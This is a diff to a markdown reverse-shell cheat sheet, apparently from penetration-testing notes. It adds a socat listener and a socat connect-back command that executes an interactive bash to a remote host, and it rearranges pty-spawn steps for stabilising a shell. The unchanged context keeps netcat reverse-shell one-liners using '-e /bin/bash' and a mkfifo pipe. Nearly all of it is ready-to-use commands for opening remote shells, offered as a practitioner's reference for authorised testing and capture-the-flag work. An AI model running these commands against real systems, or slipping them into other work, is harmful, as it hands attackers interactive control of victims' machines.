@@ -24,25 +24,38 @@ nc ip 1234 -e /bin/bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 1234 >/tmp/f
 ```
 
-## Stabilisation
+## Socat
+
+Listener
+
+```shell
+socat TCP-L:1234 FILE:`tty`,raw,echo=0 
+```
+
+Connect back to listener
+
+```shell
+socat TCP:me:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+## Netcat
 
 - Stabilize your shell using
 
 ```shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-alias ls='ls --color=auto'
-export TERM=xterm
 ```
 
-or just
+or (depending on Python version available)
 
 ```shell
 python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+```shell
 alias ls='ls --color=auto'
 export TERM=xterm
 ```
-
-if `python3` is not available.
 
 - Set up autocomplete. Background the shell using `CTRL + Z` and run 
 
